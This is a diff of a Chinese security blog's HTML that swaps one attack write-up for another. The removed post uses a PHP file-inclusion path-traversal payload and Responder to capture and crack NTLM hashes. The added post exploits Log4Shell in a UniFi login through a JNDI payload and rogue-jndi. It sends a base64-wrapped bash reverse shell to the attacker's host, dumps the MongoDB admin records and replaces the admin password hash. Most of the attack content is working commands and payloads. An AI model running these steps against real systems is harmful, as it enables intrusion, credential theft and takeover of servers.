@@ -16,28 +16,40 @@
   <meta name="author" content="liuty">
   <meta name="keywords" content="">
   
-    <meta name="description" content="背景在打进内网之后，并且在隧道建立完毕的情况下，进行当前内网主机的一个探测，发现80端口的http服务存在一个文件包含漏洞，而且在前期内网信息收集的时候发现smb服务是开着的（win系统）先简单说一下这个文件包含漏洞，url中有一个page参数，借助文件包含漏洞，我们可以尝试读取系统中的敏感文件，比如hosts文件，win下的hosts文件在windows\system32\drivers\etc">
+    <meta name="description" content="开局一个登录框，是一个UniFi Network,而且版本信息直接打印在登陆页  那就直接根据版本信息上google搜一下看看，有没有CVE可以利用或者默认用户名密码尝试弱口令登陆，搜索发现了存在log4j漏洞  log4j漏洞可通过注入操作系统命令来利用，使得攻击者可以在运行应用程序的服务器上执行任意操作系统命令，从而完全破坏应用程序并破坏其数据简述一下该漏洞的原理：org.apache.log">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SMB窃取NTLMhash">
-<meta property="og:url" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/index.html">
+<meta property="og:title" content="由Log4j引起的MongoDB提权">
+<meta property="og:url" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="liuty&#39;s blog">
-<meta property="og:description" content="背景在打进内网之后，并且在隧道建立完毕的情况下，进行当前内网主机的一个探测，发现80端口的http服务存在一个文件包含漏洞，而且在前期内网信息收集的时候发现smb服务是开着的（win系统）先简单说一下这个文件包含漏洞，url中有一个page参数，借助文件包含漏洞，我们可以尝试读取系统中的敏感文件，比如hosts文件，win下的hosts文件在windows\system32\drivers\etc">
+<meta property="og:description" content="开局一个登录框，是一个UniFi Network,而且版本信息直接打印在登陆页  那就直接根据版本信息上google搜一下看看，有没有CVE可以利用或者默认用户名密码尝试弱口令登陆，搜索发现了存在log4j漏洞  log4j漏洞可通过注入操作系统命令来利用，使得攻击者可以在运行应用程序的服务器上执行任意操作系统命令，从而完全破坏应用程序并破坏其数据简述一下该漏洞的原理：org.apache.log">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09_1.png">
-<meta property="og:image" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09.png">
-<meta property="og:image" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-23.png">
-<meta property="og:image" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_10-57.png">
-<meta property="og:image" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-02.png">
-<meta property="article:published_time" content="2024-03-05T11:23:40.000Z">
-<meta property="article:modified_time" content="2024-03-05T13:00:56.073Z">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-27.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-29.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_12-37.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-42.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-41.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-09.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-20.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-21.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-22.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-23.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-27.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-32.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-34.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39_1.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-49.png">
+<meta property="og:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-53.png">
+<meta property="article:published_time" content="2024-03-06T05:12:23.000Z">
+<meta property="article:modified_time" content="2024-03-06T05:37:59.083Z">
 <meta property="article:author" content="liuty">
-<meta property="article:tag" content="姿势总结">
+<meta property="article:tag" content="外网打点">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09_1.png">
+<meta name="twitter:image" content="http://example.com/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-27.png">
   
   
   
-  <title>SMB窃取NTLMhash - liuty&#39;s blog</title>
+  <title>由Log4j引起的MongoDB提权 - liuty&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -231,7 +243,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SMB窃取NTLMhash"></span>
+            <span id="subtitle" data-typed-text="由Log4j引起的MongoDB提权"></span>
           
         </div>
 
@@ -242,8 +254,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-05 19:23" pubdate>
-          2024年3月5日 晚上
+        <time datetime="2024-03-06 13:12" pubdate>
+          2024年3月6日 下午
         </time>
       </span>
     
@@ -254,7 +266,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          757 字
+          1.5k 字
         
       </span>
     
@@ -265,7 +277,7 @@
         
         
         
-          7 分钟
+          13 分钟
         
       </span>
     
@@ -310,32 +322,55 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SMB窃取NTLMhash</h1>
+            <h1 id="seo-header">由Log4j引起的MongoDB提权</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在打进内网之后，并且在隧道建立完毕的情况下，进行当前内网主机的一个探测，发现80端口的http服务存在一个文件包含漏洞，而且在前期内网信息收集的时候发现smb服务是开着的<br>（win系统）<br>先简单说一下这个文件包含漏洞，url中有一个page参数，借助文件包含漏洞，我们可以尝试读取系统中的敏感文件，比如hosts文件，win下的hosts文件在windows\system32\drivers\etc\hosts中，所以构造payload</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>windows<span class="hljs-regexp">/system32/</span>drivers<span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure>
-<p>页面回显如下</p>
-<img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-05_11-09_1.png">
-<h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>我们之所以会成功是因为index.php里包含include()这个方法，将会读取page这个参数的值，如果开发者没有进一步处理page参数所得到的值时，这个攻击就会成功<br>php include函数的示例如下</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean">文件<span class="hljs-number">1</span>：root.php<br>&lt;?php<br>$color = <span class="hljs-string">&#x27;green&#x27;</span>;<br>$fruit = <span class="hljs-string">&#x27;apple&#x27;</span>;<br>?&gt;<br>#############################################<br>文件<span class="hljs-number">2</span>：test.php<br>&lt;?php<br>echo <span class="hljs-string">&quot;A $color $fruit&quot;</span>; <span class="hljs-comment">// output = &quot;A&quot;</span><br>include <span class="hljs-string">&#x27;root.php&#x27;</span>;<br>echo <span class="hljs-string">&quot;A $color $fruit&quot;</span>; <span class="hljs-comment">// output = &quot;A green apple&quot;</span><br>?&gt;<br></code></pre></td></tr></table></figure>
-<p>当test.php包含（include）root.php后，color及fruit就被赋予值了</p>
-<p>那么如何进一步利用呢？两种思路:一是写入或包含远程后门文件，做权限的维持；二是继续信息收集系统的账号密码信息，进行PTH等操作，我们先测试一下远程文件包含，我们知道远程文件包含还需要两个条件：allow_url_include、allow_url_fopen要为“ON”，而本地文件包含则不需要，测试一下，直接报错，说明不存在远程文件包含</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=http://www.baidu.com<br></code></pre></td></tr></table></figure>
-<img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-05_11-09.png">
-<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h2 id="利用SMB窃取NTLM-hash"><a href="#利用SMB窃取NTLM-hash" class="headerlink" title="利用SMB窃取NTLM hash"></a>利用SMB窃取NTLM hash</h2><p>SMB 协议支持 NTLM 和 LM 加密，我们通过恶意程序监听，在远程主机访问我们的 SMB 服务时，因为要进行身份验证，会发送相关信息，我们就可以获取目标主机的 hash 值，这个是为了账号密码的安全性，一般都不进行明文验证，而是使用摘要值进行比对，这样就给了攻击者机会，在不需要知道正确的账号密码的情况下，只要摘要值比对成功就可以登录<br>利用工具Responder，进行监听网卡，确定目标主机和跳板机在一个网段内，这个时候就体现了隧道的重要性了，我这里是tun0</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure>
-<p>然后通过文件包含漏洞构造payload,并拼接访问url触发</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>age=<span class="hljs-regexp">//</span>跳板机<span class="hljs-variable constant_">IP</span>/somefile<br></code></pre></td></tr></table></figure>
-<img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-05_11-23.png">
-<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>成功接收到服务器的的 NTLM 值,一般是第一次请求才会发送，然后会保存到本地，下次就不会再发送了</p>
-<h2 id="NTLM-碰撞获取可用账号密码"><a href="#NTLM-碰撞获取可用账号密码" class="headerlink" title="NTLM 碰撞获取可用账号密码"></a>NTLM 碰撞获取可用账号密码</h2><p>获取到 NTLM 值，下一步就是暴破了，将获取的值保存到一个文件中，然后用john进行破解碰撞，就获取到了账户和密码</p>
-<img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_10-57.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-05_10-57.png">
-<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>拿到账户密码直接登录连接获取shell，并可以为后续的密码喷洒等工作做准备</p>
-<img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-02.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-05_11-02.png">
-<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6>
+                <p>开局一个登录框，是一个UniFi Network,而且版本信息直接打印在登陆页</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-27.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_08-27.png">
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>那就直接根据版本信息上google搜一下看看，有没有CVE可以利用或者默认用户名密码尝试弱口令登陆，搜索发现了存在log4j漏洞</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-29.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_08-29.png">
+<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>log4j漏洞可通过注入操作系统命令来利用，使得攻击者可以在运行应用程序的服务器上执行任意操作系统命令，从而完全破坏应用程序并破坏其数据<br>简述一下该漏洞的原理：<br>org.apache.logging.log4j.core.pattern.MessagePatternConverter类的format()方法发现日志中包含“${”就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。“${”可使用的关键词非常多，例如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;java:os&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;hostName&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;jndi:logging/context-name&#125;</span><br></code></pre></td></tr></table></figure>
+<p>org.apache.logging.log4j.core.lookup.StrSubstitutor中提取参数并通过lookup进行内容替换，当日志在打印时遇到”${“后，Interpolator类以:号作为分割，将表达式内容分割成两部分，前面部分作为prefix，后面部分作为key,然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，经典poc:${jndi:ldap:&#x2F;&#x2F;liuty_ip&#x2F;exp}，相信大家看到这个poc就会想到jndi注入，没错，当JNDI变量可控时引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行，当刚才那个poc被传入到log4j日志文件中，lookup会将JNDI注入可执行语句执行，程序会通过ldap协议访问liuty_ip这个地址，然后liuty_ip就会返回一个包含java代码的class文件的地址，然后再通过返回的地址下载class文件并执行，从而达成恶意攻击的效果，我用ppt简单画一下漏洞利用过程</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_12-37.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_12-37.png">
+<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>为了验证漏洞存在的真实性，我们可以在向&#x2F;api&#x2F;login发出POST请求后，进行抓包拦截，将payload输入到remember参数中，因为POST数据作为JSON对象发送，并且payload包含{}，为了防止它被解析为另一个JSON对象，我们将其括在””内，以便将其解析为字符串，这里将remember的true修改为”${jndi:ldap:&#x2F;&#x2F;my_ip&#x2F;随意}”。<br>（这里显示InvalidPayload无效，但实际上payload正在运行）</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-42.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_08-42.png">
+<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>为什么这么说呢？我们可以用tcpdump进行流量的监听，在发送带有payload的数据包那一刻，是有流量被监听到的，所以说payload实际是运行的，也证实了漏洞的存在</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_08-41.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_08-41.png">
+<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>接下来进行漏洞的利用，借助到一个工具rogue-jndi（rogue），这个工具需要我们自己mvn构建成jar包，构建成功后会生成在target目录当中，如下</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-09.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-09.png">
+<h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>构建成功之后，运行rogue后会启动一个LDAP服务器并可以使目标服务器接收连接并执行恶意代码，首先构造并传递一个payload，该payload负责在目标服务器上为我们提供一个shell，方便交互式的控制目标服务器，不过要先对payload进行Base64编码，防止出现一些编码问题，最后控制目标服务器进行解码并执行即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -c bash -i &gt;&amp;/dev/tcp/liuty_ip/port 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure>
+<p>随后启动rogue，同时将payload作为command参数的一部分以及将我们的攻击机IP传递给hostname参数，并同时打开监听端口</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java -jar target/RogueJndi-<span class="hljs-number">1.1</span><span class="hljs-selector-class">.jar</span> <span class="hljs-attr">--command</span> <span class="hljs-string">&quot;bash -c &#123;echo,上一步加密完的指令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-attr">--hostname</span> <span class="hljs-string">&quot;攻击（监听）ip&quot;</span><br></code></pre></td></tr></table></figure>
+<p>回到我们抓包的请求当中，加入payload，构造POST请求，将remember的值改为rogue中mapping值</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-string">&quot;remember&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;jndi:ldap:<span class="hljs-regexp">//m</span>y_ip:<span class="hljs-number">1389</span>/o=xxxxx&#125;</span></span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-20.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-20.png">
+<h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>发送请求后，收到一个与我们ldap服务器的连接情况，并且监听端口会接收到反弹过来的shell</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-21.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-21.png">
+<h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>拿到shell之后，先改变一下shell,使其变得交互，往往渗透过程中交互式的shell还是很重要的</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-22.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-22.png">
+<h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>通过查看进程，发现MongoDB数据库开着，端口为27117,进程中也没别的数据库了，应该就是UniFi的后台数据库吧</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-23.png">
+<h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>查阅资料可知，UniFi默认数据库的名称一般为ace，通过mongo命令尝试提取管理员密码来与MongoDB服务进行交互</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">mongo <span class="hljs-attr">--port</span> <span class="hljs-number">27117</span> ace <span class="hljs-attr">--eval</span> &quot;db<span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.find</span>()<span class="hljs-selector-class">.forEach</span>(printjson);&quot;<br><br>##命令解释：db<span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.find</span>()为查询admin表下的所有数据，也就是查询所有用户；<span class="hljs-built_in">forEach</span>()为遍历；printjson为打印json格式<br></code></pre></td></tr></table></figure>
+<p>拿到了管理员账号密码以及管理员账户id号</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-27.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-27.png">
+<h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>$6意思是SHA-512加密，如果我们不知道也没关系，可以使用hashid来判断该密码的类型，经验证确实为SHA-512加密，破解难度挺大，但我们可以使用自己创建的哈希更改x_shadow密码哈希，以替换管理员密码并通过管理面板进行身份验证，我们使用mkpasswd来创建一个密码，就123456吧，并制定SHA-512加密类型</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-32.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-32.png">
+<h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>现在使用mongo命令对我们创建的hash来进行替换，这个时候需要通过管理员账户的_id进行标识，替换其x_shadow</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-34.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-34.png">
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">mongo --port <span class="hljs-number">27117</span> ace --<span class="hljs-built_in">eval</span> &#x27;db.admin.<span class="hljs-keyword">update</span>(&#123;<span class="hljs-string">&quot;_id&quot;</span>:ObjectId(<span class="hljs-string">&quot;管理员账户id&quot;</span>)&#125;,&#123;$<span class="hljs-built_in">set</span>:&#123;<span class="hljs-string">&quot;x_shadow&quot;</span>:<span class="hljs-string">&quot;SHA_512 Hash&quot;</span>&#125;&#125;)&#x27;<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-39.png">
+<h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>检查密码是否更新，重新遍历一次，看到x_shadow内容已经替换成我们自己创建的hash值</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-39_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-39_1.png">
+<h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>接下来我们就可以使用管理员账号和密码（123456）登陆到UniFi后台，在后台设置中心里发现了ssh账号密码…还是root账户</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-49.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-49.png">
+<h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>ssh直接连！</p>
+<img src="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/2024-03-06_09-53.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-06_09-53.png">
+<h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6>
                 
               </div>
             
@@ -353,7 +388,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
   
   
 
@@ -368,7 +403,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" class="print-no-link">#姿势总结</a>
+        <a href="/tags/%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/" class="print-no-link">#外网打点</a>
       
     </div>
   
@@ -380,8 +415,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SMB窃取NTLMhash</div>
-      <div>http://example.com/2024/03/05/SMB窃取NTLMhash/</div>
+      <div>由Log4j引起的MongoDB提权</div>
+      <div>http://example.com/2024/03/06/由Log4j引起的MongoDB提权/</div>
     </div>
     <div class="license-meta">
       
@@ -393,7 +428,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年3月5日</div>
+          <div>2024年3月6日</div>
         </div>
       
       
@@ -425,18 +460,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/03/06/%E7%94%B1Log4j%E5%BC%95%E8%B5%B7%E7%9A%84MongoDB%E6%8F%90%E6%9D%83/" title="由Log4j引起的MongoDB提权">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">由Log4j引起的MongoDB提权</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/" title="Wifi取证——WPA解密">
-                        <span class="hidden-mobile">Wifi取证——WPA解密</span>
+                      <a href="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/" title="SMB窃取NTLMhash">
+                        <span class="hidden-mobile">SMB窃取NTLMhash</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
